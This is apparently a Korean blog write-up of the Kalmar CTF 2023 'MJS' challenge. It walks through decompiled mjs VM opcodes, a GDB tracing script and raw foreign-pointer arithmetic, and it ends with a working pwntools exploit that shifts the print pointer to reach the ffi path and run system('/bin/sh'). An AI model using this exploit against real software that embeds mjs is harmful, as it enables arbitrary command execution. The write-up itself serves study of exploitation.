mjs_get_int(v48, *v23); v49 = mjs_pop(mjsa); *vptr(\u0026mjsa-\u003estack, (int)retval_pos - 1) = v49; } else { mjs_set_errorf(mjsa, MJS_INTERNAL_ERROR, \"cannot return\"); } goto LABEL_93; case 0x23u: i = bp_0.data.len; goto LABEL_93; case 0x24u: bcode_offset = *(_DWORD *)\u0026code[i + 5]; i += bcode_offset; goto LABEL_93; case 0x25u: if ( prev_opcode != 22 ) mjsa-\u003evals.last_getprop_obj = 0xFFF3000000000000LL; push_mjs_val(\u0026mjsa-\u003earg_stack, mjsa-\u003evals.last_getprop_obj); v50 = mjsa; p_arg_stack = \u0026mjsa-\u003earg_stack; v20 = _mm_sub_pd( (__m128d)_mm_unpacklo_epi32((__m128i)mjs_stack_size(\u0026mjsa-\u003estack), (__m128i)xmmword_24020), (__m128d)xmmword_24030); v21 = mjs_mk_number(v50, _mm_unpackhi_pd(v20, v20).m128d_f64[0] + v20.m128d_f64[0]); push_mjs_val(p_arg_stack, v21); goto LABEL_93; case 0x26u: iterator = vptr(\u0026mjsa-\u003estack, -1); obj_1 = *vptr(\u0026mjsa-\u003estack, -2); if ( mjs_is_object(obj_1) ) { name = *vptr(\u0026mjsa-\u003estack, -3); key_2 = mjs_next(mjsa, obj_1, iterator); if ( key_2 != 0xFFF3000000000000LL ) { scope = mjs_find_scope(mjsa, name); mjs_set_v(mjsa, scope, name, key_2); } } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \"can't iterate over non-object value\"); } goto LABEL_93; default: mjs_dump(mjsa, 1); mjs_set_errorf( mjsa, MJS_INTERNAL_ERROR, \"Unknown opcode: %d, off %d+%d\", opcode, LODWORD(bp_0.start_idx), (unsigned int)i); i = bp_0.data.len; goto LABEL_93; } } } 이 함수에서 VM이 돌아간다.\n직접 OPCODE를 분석해보기 위해서 gdbscript를 작성했다.\nimport gdb gdb.execute(\"start\") res = gdb.execute(\"vmmap\",to_string=True) res =res[230:] binbase = int(res[res.find('0x') : res.find('0x')+8*2+2],16) bp_off = [0x007219] for i in bp_off: gdb.execute(\"b * \"+hex(binbase + i)) gdb.execute(\"c\") opcode = [] l = 8 for i in range(l): rax = int(gdb.parse_and_eval(\"$rax\")) opcode.append(rax) gdb.execute(\"c\") print(i) print(opcode) OPCODE를 배열을 뽑아볼 수 있었다. [36, 11, 9, 22, 37, 11, 29, 35] 분석을 편하게 하기 위해서 파이썬 스크립트를 작성했다.\nstr_ = '''enum mjs_opcode { OP_NOP, /* ( -- ) */ OP_DROP, /* ( a -- ) */ OP_DUP, /* ( a -- a a ) */ OP_SWAP, /* ( a b -- b a ) */ OP_JMP, /* ( -- ) */ OP_JMP_TRUE, /* ( -- ) */ OP_JMP_NEUTRAL_TRUE, /* ( -- ) */ OP_JMP_FALSE, /* ( -- ) */ OP_JMP_NEUTRAL_FALSE, /* ( -- ) */ OP_FIND_SCOPE, /* ( a -- a b ) */ OP_PUSH_SCOPE, /* ( -- a ) */ OP_PUSH_STR, /* ( -- a ) */ OP_PUSH_TRUE, /* ( -- a ) */ OP_PUSH_FALSE, /* ( -- a ) */ OP_PUSH_INT, /* ( -- a ) */ OP_PUSH_DBL, /* ( -- a ) */ OP_PUSH_NULL, /* ( -- a ) */ OP_PUSH_UNDEF, /* ( -- a ) */ OP_PUSH_OBJ, /* ( -- a ) */ OP_PUSH_ARRAY, /* ( -- a ) */ OP_PUSH_FUNC, /* ( -- a ) */ OP_PUSH_THIS, /* ( -- a ) */ OP_GET, /* ( key obj -- obj[key] ) */ OP_CREATE, /* ( key obj -- ) */ OP_EXPR, /* ( ... -- a ) */ OP_APPEND, /* ( a b -- ) */ OP_SET_ARG, /* ( a -- a ) */ OP_NEW_SCOPE, /* ( -- ) */ OP_DEL_SCOPE, /* ( -- ) */ OP_CALL, /* ( func param1 param2 ... num_params -- result ) */ OP_RETURN, /* ( -- ) */ OP_LOOP, /* ( -- ) Push break \u0026 continue addresses to loop_labels */ OP_BREAK, /* ( -- ) */ OP_CONTINUE, /* ( -- ) */ OP_SETRETVAL, /* ( a -- ) */ OP_EXIT, /* ( -- ) */ OP_BCODE_HEADER, /* ( -- ) */ OP_ARGS, /* ( -- ) Mark the beginning of function call arguments */ OP_FOR_IN_NEXT, /* ( name obj iter_ptr -- name obj iter_ptr_next ) */ OP_MAX'''.replace(' ','') str_ = (str_.split(',')) OPCODE = [36, 11, 9, 22, 37, 11, 29, 35] # OPCODE =[36, 11, 9, 22, 35] # OPCODE = [36, 11, 10, 23, 11, 9, 11, 9, 22, 24] for op in OPCODE: k=0 for i in str_: if op == k: print(i[i.find(\"OP_\"):] + ' = '+ hex(k)) k+=1 root@ed1ff428eb33 ~/Desktop/Kalmar/MJS - KalmarCTF ❯ python3 print_opcode.py OP_BCODE_HEADER = 0x24 OP_PUSH_STR = 0xb OP_FIND_SCOPE = 0x9 OP_GET = 0x16 OP_ARGS = 0x25 OP_PUSH_STR = 0xb OP_CALL = 0x1d OP_EXIT = 0x23 case 0xBu: length = cs_varint_decode_unsafe(\u0026code[i + 1], \u0026llen_4); v55 = mjsa; v16 = mjs_mk_string(mjsa, (const char *)\u0026code[i + 1 + llen_4], length, 1); mjs_push(v55, v16); i += length + llen_4; goto LABEL_93; OP_PUSH_STR은 그냥 문자열을 약간의 가공을 해서 스택에 push하는 명령이다.\n0xfff700746e697270 뒤에는 그냥 아스키고 앞에 0xfff7을 추가해준다. 길이에 따라 로직이 다르지만, print 문자열에 한에서는 위 값이 push된다.\nvoid __cdecl mjs_push(mjs *mjs, mjs_val_t v) { push_mjs_val(\u0026mjs-\u003estack, v); } void __cdecl push_mjs_val(mbuf *m, mjs_val_t v) { mjs_val_t va; // [rsp+0h] [rbp-10h] BYREF mbuf *ma; // [rsp+8h] [rbp-8h] ma = m; va = v; mbuf_append(m, \u0026va, 8uLL); } size_t __cdecl mbuf_append(mbuf *a, const void *buf, size_t len) { return mbuf_insert(a, a-\u003elen, buf, len); } OP_FIND_SCOPE는 현재 스코프를 찾는 명령이다. OP_CREATE 같은 명령을 수행할때, SCOPE에 값이 추가된다.\n0xfff1561eb4251558 vm stack에 push 되는 값은 위와 같은 주소값이다. 0xfff1이 마스크? 이고 하위 6바이트가 주소로 쓰인다.\nint __cdecl mjs_is_object(mjs_val_t v) { bool v2; // [rsp+1h] [rbp-9h] v2 = 1; if ( (v \u0026 0xFFFF000000000000LL) != 0xFFF1000000000000LL ) return (v \u0026 0xFFFF000000000000LL) == 0xFFFC000000000000LL; return v2; } mjs_is_object 함수가 비교하는 것을 보면, 오브젝트임을 알 수 있다.\nint mjs_is_object(mjs_val_t v) { return (v \u0026 MJS_TAG_MASK) == MJS_TAG_OBJECT || (v \u0026 MJS_TAG_MASK) == MJS_TAG_ARRAY; } OP_GET은 함수의 주소를 찾을때 사용하는 명령어이다.\ncase 0x16u: obj_0 = mjs_pop(mjsa); // SCOPE key_1 = mjs_pop(mjsa); // ENCODED STR val_0 = 0xFFF3000000000000LL; if ( !getprop_builtin(mjsa, obj_0, key_1, \u0026val_0) )// NOT PROPERTY BUILTIN { if ( mjs_is_object(obj_0) ) val_0 = mjs_get_v_proto(mjsa, obj_0, key_1);// OBJECT -\u003e GET PROTO else mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \"type error\"); } mjs_push(mjsa, val_0); if ( prev_opcode == 9 ) mjsa-\u003evals.last_getprop_obj = 0xFFF3000000000000LL; else mjsa-\u003evals.last_getprop_obj = obj_0; goto LABEL_93; 그 scope의 object에서 key값으로 값을 찾아서 proto?를 얻어서 vm stack에 push한다.\nOP_ARGS는 그냥 인자를 맞춰주는 부분이다. 분석은 안했다.\nOP_CALL은 함수를 호출해준다.\ncase 0x1Du: retval_stack_idx = vtop(\u0026mjsa-\u003earg_stack); func_pos = mjs_get_int(mjsa, retval_stack_idx) - 1; func = vptr(\u0026mjsa-\u003estack, func_pos); // get pointer mjs_pop_val(\u0026mjsa-\u003earg_stack); if ( mjs_is_function(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); off_call = mjs_get_func_addr(*func) - 1; bp_0 = *mjs_bcode_part_get_by_offset(mjsa, off_call); code = (const uint8_t *)bp_0.data.p; i = off_call - bp_0.start_idx; *func = 0xFFF3000000000000LL; } else if ( mjs_is_ffi_sig(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); mjs_ffi_call2(mjsa); call_stack_restore_frame(mjsa); } else if ( mjs_is_foreign(*func) ) { call_stack_push_frame(mjsa, i + bp_0.start_idx, retval_stack_idx); ptr = (void (__fastcall *)(mjs *))mjs_get_ptr(mjsa, *func); ptr(mjsa); call_stack_restore_frame(mjsa); } else { mjs_set_errorf(mjsa, MJS_TYPE_ERROR, \"calling non-callable\"); } goto LABEL_93; mjs_print는 foreign이다.\nint __cdecl mjs_is_foreign(mjs_val_t v) { return (v \u0026 0xFFFF000000000000LL) == 0xFFF2000000000000LL; } OP_GET에서 가져온 함수의 주소의 마스크가 0xfff2이기 때문이다.\nvoid *__cdecl mjs_get_ptr(mjs *mjs, mjs_val_t v) { if ( mjs_is_foreign(v) ) return get_ptr(v); else return 0LL; } void *__cdecl get_ptr(mjs_val_t v) { return (void *)(v \u0026 0xFFFFFFFFFFFFLL); } 실제로 ptr을 가져올때 마스크는 빼고 본다. 즉 실제 주소를 가져와서 그냥 호출한다.\nOP_EXPR은 어떤 변수에 저장할때 있었던 OPCODE이다. OP_EXPR도 한번 살펴보면, 다음과 같다.\ncase 0x18u: op = code[i + 1]; exec_expr(mjsa, op); ++i; void __cdecl exec_expr(mjs *mjs, int op) { mjs_val_t v2; // rax mjs_val_t v3; // rax mjs_val_t v4; // rax int is_truthy; // eax mjs_val_t v6; // rax mjs_val_t v7; // rax mjs_val_t v8; // rax int v9; // eax mjs_val_t v10; // rax int v11; // eax mjs_val_t v12; // rax mjs_val_t v13; // rax mjs_val_t v14; // rax mjs_val_t v15; // rax mjs_val_t v16; // rax mjs_val_t v17; // rax mjs_val_t v18; // rax mjs_val_t v19; // rax mjs_val_t v20; // rax mjs_val_t v21; // rax mjs_val_t v22; // rax mjs_val_t v23; // rax mjs_val_t v24; // rax mjs_val_t v25; // rax mjs_val_t v26; // rax mjs_val_t v27; // rax mjs_val_t v28; // rax mjs_val_t v29; // rax const char *v30; // rax mjs_val_t v31; // rax mjs_val_t v32; // [rsp+18h] [rbp-228h] mjs_val_t v; // [rsp+28h] [rbp-218h] mjs_val_t v34; // [rsp+38h] [rbp-208h] mjs_val_t v35; // [rsp+48h] [rbp-1F8h] mjs_val_t v_2; // [rsp+110h] [rbp-130h] mjs_val_t key_3; // [rsp+118h] [rbp-128h] mjs_val_t obj_3; // [rsp+120h] [rbp-120h] mjs_val_t v_1; // [rsp+128h] [rbp-118h] mjs_val_t key_2; // [rsp+130h] [rbp-110h] mjs_val_t obj_2; // [rsp+138h] [rbp-108h] mjs_val_t v1_0; // [rsp+140h] [rbp-100h] mjs_val_t key_1; // [rsp+150h] [rbp-F0h] mjs_val_t obj_1; // [rsp+158h] [rbp-E8h] mjs_val_t v1; // [rsp+160h] [rbp-E0h] mjs_val_t key_0; // [rsp+170h] [rbp-D0h] mjs_val_t obj_0; // [rsp+178h] [rbp-C8h] unsigned int ival; // [rsp+188h] [rbp-B8h] int ikey; // [rsp+18Ch] [rbp-B4h] mjs_val_t key; // [rsp+190h] [rbp-B0h] mjs_val_t obj; // [rsp+198h] [rbp-A8h] mjs_val_t val_0; // [rsp+1A0h] [rbp-A0h] double a_7; // [rsp+1A8h] [rbp-98h] double b_5; // [rsp+1B0h] [rbp-90h] double a_6; // [rsp+1B8h] [rbp-88h] double b_4; // [rsp+1C0h] [rbp-80h] double a_5; // [rsp+1C8h] [rbp-78h] double b_3; // [rsp+1D0h] [rbp-70h] double a_4; // [rsp+1D8h] [rbp-68h] double b_2; // [rsp+1E0h] [rbp-60h] mjs_val_t b_1; // [rsp+1E8h] [rbp-58h] mjs_val_t a_3; // [rsp+1F0h] [rbp-50h] mjs_val_t b_0; // [rsp+1F8h] [rbp-48h] mjs_val_t a_2; // [rsp+200h] [rbp-40h] double a_1; // [rsp+208h] [rbp-38h] mjs_val_t val; // [rsp+210h] [rbp-30h] double a_0; // [rsp+218h] [rbp-28h] mjs_val_t a; // [rsp+220h] [rbp-20h] mjs_val_t b; // [rsp+228h] [rbp-18h] switch ( op ) { case 4: case 20: case 50: return; case 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } else if ( mjs_is_foreign(obj) ) { ikey = mjs_get_int(mjs, key); ival = mjs_get_int(mjs, val_0); if ( !mjs_is_number(key) ) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \"index must be a number\"); mjs_push(mjs, 0xFFF3000000000000LL); return; } if ( mjs_is_number(val_0) \u0026\u0026 ival \u003c 0x100 ) { *((_BYTE *)mjs_get_ptr(mjs, obj) + ikey) = ival; } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \"only number 0 .. 255 can be assigned\"); val_0 = 0xFFF3000000000000LL; } } else { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \"unsupported object type\"); } mjs_push(mjs, val_0); return; case 12: case 13: case 14: case 15: case 16: case 17: case 18: case 19: case 26: case 27: case 48: b = mjs_pop(mjs); a = mjs_pop(mjs); v2 = do_op(mjs, a, b, op); mjs_push(mjs, v2); return; case 22: val = mjs_pop(mjs); is_truthy = mjs_is_truthy(mjs, val); v6 = mjs_mk_boolean(mjs, is_truthy == 0); mjs_push(mjs, v6); return; case 23: v7 = mjs_pop(mjs); a_1 = mjs_get_double(mjs, v7); v8 = mjs_mk_number(mjs, (double)~(int)a_1); mjs_push(mjs, v8); return; case 24: v13 = mjs_pop(mjs); b_2 = mjs_get_double(mjs, v13); v14 = mjs_pop(mjs); a_4 = mjs_get_double(mjs, v14); v15 = mjs_mk_boolean(mjs, b_2 \u003e a_4); mjs_push(mjs, v15); return; case 25: v16 = mjs_pop(mjs); b_3 = mjs_get_double(mjs, v16); v17 = mjs_pop(mjs); a_5 = mjs_get_double(mjs, v17); v18 = mjs_mk_boolean(mjs, a_5 \u003e b_3); mjs_push(mjs, v18); return; case 28: obj_2 = mjs_pop(mjs); key_2 = mjs_pop(mjs); if ( !mjs_is_object(obj_2) || !mjs_is_string(key_2) ) goto LABEL_32; v = mjs_get_v(mjs, obj_2, key_2); v27 = mjs_mk_number(mjs, 1.0); v_1 = do_op(mjs, v, v27, 14); mjs_set_v(mjs, obj_2, key_2, v_1); mjs_push(mjs, v_1); return; case 29: obj_3 = mjs_pop(mjs); key_3 = mjs_pop(mjs); if ( !mjs_is_object(obj_3) || !mjs_is_string(key_3) ) goto LABEL_28; v32 = mjs_get_v(mjs, obj_3, key_3); v28 = mjs_mk_number(mjs, 1.0); v_2 = do_op(mjs, v32, v28, 13); mjs_set_v(mjs, obj_3, key_3, v_2); mjs_push(mjs, v_2); return; case 30: op_assign(mjs, 13); return; case 31: op_assign(mjs, 14); return; case 32: op_assign(mjs, 12); return; case 33: op_assign(mjs, 15); return; case 34: op_assign(mjs, 17); return; case 35: op_assign(mjs, 18); return; case 36: op_assign(mjs, 16); return; case 37: op_assign(mjs, 19); return; case 38: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \"Use ===, not ==\"); return; case 39: mjs_set_errorf(mjs, MJS_NOT_IMPLEMENTED_ERROR, \"Use !==, not !=\"); return; case 40: v19 = mjs_pop(mjs); b_4 = mjs_get_double(mjs, v19); v20 = mjs_pop(mjs); a_6 = mjs_get_double(mjs, v20); v21 = mjs_mk_boolean(mjs, b_4 \u003e= a_6); mjs_push(mjs, v21); return; case 41: v22 = mjs_pop(mjs); b_5 = mjs_get_double(mjs, v22); v23 = mjs_pop(mjs); a_7 = mjs_get_double(mjs, v23); v24 = mjs_mk_boolean(mjs, a_7 \u003e= b_5); mjs_push(mjs, v24); return; case 44: a_2 = mjs_pop(mjs); b_0 = mjs_pop(mjs); v9 = check_equal(mjs, a_2, b_0); v10 = mjs_mk_boolean(mjs, v9); mjs_push(mjs, v10); return; case 45: a_3 = mjs_pop(mjs); b_1 = mjs_pop(mjs); v11 = check_equal(mjs, a_3, b_1); v12 = mjs_mk_boolean(mjs, v11 == 0); mjs_push(mjs, v12); return; case 46: op_assign(mjs, 26); return; case 47: op_assign(mjs, 27); return; case 49: op_assign(mjs, 48); return; case 51: v3 = mjs_pop(mjs); a_0 = mjs_get_double(mjs, v3); v4 = mjs_mk_number(mjs, COERCE_DOUBLE(*(_QWORD *)\u0026a_0 ^ 0x8000000000000000LL)); mjs_push(mjs, v4); return; case 52: obj_0 = mjs_pop(mjs); key_0 = mjs_pop(mjs); if ( mjs_is_object(obj_0) \u0026\u0026 mjs_is_string(key_0) ) { v35 = mjs_get_v(mjs, obj_0, key_0); v25 = mjs_mk_number(mjs, 1.0); v1 = do_op(mjs, v35, v25, 13); mjs_set_v(mjs, obj_0, key_0, v1); mjs_push(mjs, v35); } else { LABEL_28: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \"invalid operand for ++\"); } return; case 53: obj_1 = mjs_pop(mjs); key_1 = mjs_pop(mjs); if ( mjs_is_object(obj_1) \u0026\u0026 mjs_is_string(key_1) ) { v34 = mjs_get_v(mjs, obj_1, key_1); v26 = mjs_mk_number(mjs, 1.0); v1_0 = do_op(mjs, v34, v26, 14); mjs_set_v(mjs, obj_1, key_1, v1_0); mjs_push(mjs, v34); } else { LABEL_32: mjs_set_errorf(mjs, MJS_TYPE_ERROR, \"invalid operand for --\"); } return; case 227: v29 = mjs_pop(mjs); v30 = mjs_typeof(v29); v31 = mjs_mk_string(mjs, v30, 0xFFFFFFFFFFFFFFFFLL, 1); mjs_push(mjs, v31); return; default: if ( cs_log_print_prefix(LL_ERROR, \"src/mjs_exec.c\", 431) ) cs_log_printf(\"Unknown expr: %d\", (unsigned int)op); return; } } scope의 변수에 넣어주는 기능도 수행한다. 나머진 제대로 분석안했다.\nExploitation 파싱할때 ()를 통해서 함수를 호출하는 바이트 코드를 점화할 수 있다. exec_expr에서 함수 포인터가 위에 마스크를 달고 raw 하게 저장됨을 알 수 있다. 사실 아주 당연한 내용이지만, js 엔진 건드려본적이 없어서 잘 몰랐다.\ncase 5: val_0 = mjs_pop(mjs); // function PTR -foreign obj = mjs_pop(mjs); // scope? key = mjs_pop(mjs); // key name str if ( mjs_is_object(obj) ) { mjs_set_v(mjs, obj, key, val_0); // set foreign ptr RAW } mjs_err_t __cdecl mjs_set_v(mjs *mjs, mjs_val_t obj, mjs_val_t name, mjs_val_t val) { return mjs_set_internal(mjs, obj, name, 0LL, 0LL, val); } mjs_err_t __cdecl mjs_set_internal( mjs *mjs, mjs_val_t obj, mjs_val_t name_v, char *name, size_t name_len, mjs_val_t val) { mjs_object *o; // [rsp+8h] [rbp-58h] int need_free; // [rsp+14h] [rbp-4Ch] BYREF mjs_property *p; // [rsp+18h] [rbp-48h] mjs_err_t rcode; // [rsp+24h] [rbp-3Ch] mjs_val_t vala; // [rsp+28h] [rbp-38h] size_t name_lena; // [rsp+30h] [rbp-30h] BYREF char *namea; // [rsp+38h] [rbp-28h] BYREF mjs_val_t name_va; // [rsp+40h] [rbp-20h] BYREF mjs_val_t obja; // [rsp+48h] [rbp-18h] mjs *mjsa; // [rsp+50h] [rbp-10h] mjsa = mjs; obja = obj; name_va = name_v; namea = name; name_lena = name_len; vala = val; rcode = MJS_OK; need_free = 0; if ( name ) { name_va = 0xFFF3000000000000LL; } else { rcode = mjs_to_string(mjsa, \u0026name_va, \u0026namea, \u0026name_lena, \u0026need_free); if ( rcode ) goto clean; } p = mjs_get_own_property(mjsa, obja, namea, name_lena); if ( !p ) { if ( !mjs_is_object(obja) ) return 2; if ( !mjs_is_string(name_va) ) name_va = mjs_mk_string(mjsa, namea, name_lena, 1); p = mjs_mk_property(mjsa, name_va, vala); o = get_object_struct(obja); p-\u003enext = o-\u003eproperties; o-\u003eproperties = p; } p-\u003evalue = vala; clean: if ( need_free ) { free(namea); namea = 0LL; } return rcode; } mjs_property *__cdecl mjs_mk_property(mjs *mjs, mjs_val_t name, mjs_val_t value) { mjs_property *result; // rax result = new_property(mjs); result-\u003enext = 0LL; result-\u003ename = name; result-\u003evalue = value; return result; } value가 그대로 저장된다. 이걸로 scope에 foreign 함수 포인터를 raw하게 저장시킬 수 있다. 이제 여기서 함수 포인터에 대한 연산을 수행할 수 있다. do_op 함수의 일부 코드를 보면 왜 가능한지 알 수 있다.\n} else if (mjs_is_foreign(a) || mjs_is_foreign(b)) { /* * When one of the operands is a pointer, only + and - are supported, * and the result is a pointer. */ if (op != TOK_MINUS \u0026\u0026 op != TOK_PLUS) { mjs_prepend_errorf(mjs, MJS_TYPE_ERROR, \"invalid operands\"); } is_result_ptr = 1; 하나만 foreign pointer를 주고 그냥 상수를 더하면 된다.\n► 0x5647fc468aec \u003cexec_expr+124\u003e call do_op \u003cdo_op\u003e rdi: 0x5647fe14f2a0 ◂— 0x0 rsi: 0xfff25647fc465660 rdx: 0x403e000000000000 rcx: 0xd 실제로 연산이 될때 raw 하게 들어가는 것을 볼 수 있다. do_op에서는 do_arith_op을 호출한다.\nstatic double do_arith_op(double da, double db, int op, bool *resnan) { *resnan = false; if (isnan(da) || isnan(db)) { *resnan = true; return 0; } /* clang-format off */ switch (op) { case TOK_MINUS: return da - db; case TOK_PLUS: return da + db; case TOK_MUL: return da * db; case TOK_DIV: if (db != 0) { return da / db; } else { /* TODO(dfrank): add support for Infinity and return it here */ *resnan = true; return 0; } case TOK_REM: /* * TODO(dfrank): probably support remainder operation as it is in JS * (which works with non-integer divisor). */ db = (int) db; if (db != 0) { bool neg = false; if (da \u003c 0) { neg = true; da = -da; } if (db \u003c 0) { db = -db; } da = (double) ((int64_t) da % (int64_t) db); if (neg) { da = -da; } return da; } else { *resnan = true; return 0; } case TOK_AND: return (double) ((int64_t) da \u0026 (int64_t) db); case TOK_OR: return (double) ((int64_t) da | (int64_t) db); case TOK_XOR: return (double) ((int64_t) da ^ (int64_t) db); case TOK_LSHIFT: return (double) ((int64_t) da \u003c\u003c (int64_t) db); case TOK_RSHIFT: return (double) ((int64_t) da \u003e\u003e (int64_t) db); case TOK_URSHIFT: return (double) ((uint32_t) da \u003e\u003e (uint32_t) db); } /* clang-format on */ *resnan = true; return 0; } 그대로 연산이 되는데 상위 2바이트를 침범하면, type confusion?도 가능할 것 같다. 어쨌든 여기서 foreign pointer와 연산이 되면, 다른 함수를 호출할 수 있다.\n상위 2바이트만 안건들면 그대로 연산이 되고 0xfff2가 남아서 foreign pointer로 인식되고 OP_CALL로 함수 포인터를 호출할 수 있다. SCOPE에 그대로 저장되기 때문에 그냥 호출하면 된다.\npatch.diff에서 ffi 등록하는 코드를 지웠지만, ffi의 코드는 남아있기 때문에 ffi로 점프하면 된다.\nmjs_err_t __cdecl mjs_ffi_call(mjs *mjs) mjs_ffi_call로 점프해주면 된다.\nmjs_ffi_ctype_t __cdecl parse_cval_type(mjs *mjs, const char *s, const char *e) { bool v4; // [rsp+Eh] [rbp-32h] bool v5; // [rsp+Fh] [rbp-31h] mg_str ms; // [rsp+10h] [rbp-30h] BYREF const char *ea; // [rsp+20h] [rbp-20h] const char *sa; // [rsp+28h] [rbp-18h] mjs *mjsa; // [rsp+30h] [rbp-10h] mjsa = mjs; sa = s; ea = e; memset(\u0026ms, 0, sizeof(ms)); while ( 1 ) { v5 = 0; if ( sa \u003c ea ) v5 = ((*__ctype_b_loc())[*sa] \u0026 0x2000) != 0; if ( !v5 ) break; ++sa; } while ( 1 ) { v4 = 0; if ( ea \u003e sa ) v4 = ((*__ctype_b_loc())[*(ea - 1)] \u0026 0x2000) != 0; if ( !v4 ) break; --ea; } ms.p = sa; ms.len = ea - sa; if ( !mg_vcmp(\u0026ms, \"void\") ) return 0; if ( !mg_vcmp(\u0026ms, \"userdata\") ) return 1; if ( !mg_vcmp(\u0026ms, \"int\") ) return 3; if ( !mg_vcmp(\u0026ms, \"bool\") ) return 4; if ( !mg_vcmp(\u0026ms, \"double\") ) return 5; if ( !mg_vcmp(\u0026ms, \"float\") ) return 6; if ( !mg_vcmp(\u0026ms, \"char*\") || !mg_vcmp(\u0026ms, \"char *\") ) return 7; if ( !mg_vcmp(\u0026ms, \"void*\") || !mg_vcmp(\u0026ms, \"void *\") ) return 8; if ( !mg_vcmp(\u0026ms, \"struct mg_str\") ) return 10; if ( !mg_vcmp(\u0026ms, \"struct mg_str *\") || !mg_vcmp(\u0026ms, \"struct mg_str*\") ) return 9; mjs_prepend_errorf(mjsa, MJS_TYPE_ERROR, \"failed to parse val type \\\"%.*s\\\"\", LODWORD(ms.len), ms.p); return 11; } 이거 보고 잘 맞춰서 세팅해준다음에, system /bin/sh를 호출하면 된다. offset 잘 계산하면 system 주소를 넣어줄 수 있다.\nExploit script 익스플로잇이 되게 화가 난다.\nfrom pwn import * off = 0x6ab0 payload = 'let a = print;a+=0x6ab0;a(\"int system(char*)\")(\"/bin/sh\")' p = process([\"./mjs\",\"-e\",payload]) p.interactive() ",
  "wordCount" : "8555",
  "inLanguage": "en",
  "datePublished": "2023-03-13T00:00:00Z",
  "dateModified": "2023-03-13T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/kalmar_ctf_2023_mjs/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      Kalmar CTF 2023 - MJS
    </h1>
    <div class="post-meta">


March 2023

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#mjs" aria-label="MJS">MJS</a><ul>
                        
                <li>
                    <a href="#analysis" aria-label="Analysis">Analysis</a><ul>
                        
                <li>
                    <a href="#mjs_parse" aria-label="mjs_parse">mjs_parse</a></li>
                <li>
                    <a href="#mjs_execute" aria-label="mjs_execute">mjs_execute</a></li></ul>
                </li>
                <li>
                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
                        
                <li>
                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="mjs">MJS<a hidden class="anchor" aria-hidden="true" href="#mjs">#</a></h1>
<p>CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다.
구글링 잘했으면 바로 풀 수 있었을 것 같다.</p>
<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
